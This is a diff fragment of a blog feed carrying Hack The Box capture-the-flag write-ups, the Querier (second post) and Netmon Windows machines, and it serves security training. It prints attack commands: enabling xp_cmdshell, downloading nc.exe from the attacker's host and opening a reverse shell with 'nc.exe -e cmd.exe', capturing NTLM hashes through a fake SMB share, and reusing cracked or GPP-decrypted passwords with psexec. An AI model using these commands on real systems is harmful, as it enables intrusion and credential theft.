-&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
-EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
-&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier Next Hack The Box write-up : Hack The Box - Hackback</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry></feed>
